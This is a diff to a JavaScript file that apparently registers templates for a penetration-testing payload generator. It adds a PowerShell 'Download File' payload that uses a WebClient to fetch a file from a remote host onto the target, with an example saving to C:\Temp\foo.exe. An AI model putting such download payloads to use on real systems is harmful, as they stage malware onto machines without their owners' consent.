@@ -127,6 +127,19 @@ Load({
 	}
 })
 
+Load({
+	title: "Download File",
+	payload: '(new-object system.net.webclient).downloadFile("<RHOST>","<PROMPT (local path)>")',
+	category: "Powershell",
+	callback: function(returnToPrepare, lhost, lport, rhost, rport, user){
+		prompt.message = "Local path to save file? (eg C:\\Temp\\foo.exe) :"
+		prompt.get([{name: '_', description: ':'}], function(err, result){
+			returnToPrepare(result._)
+		})	
+
+	}
+})
+
 var unique = []
 var uniqueCategories = []
 
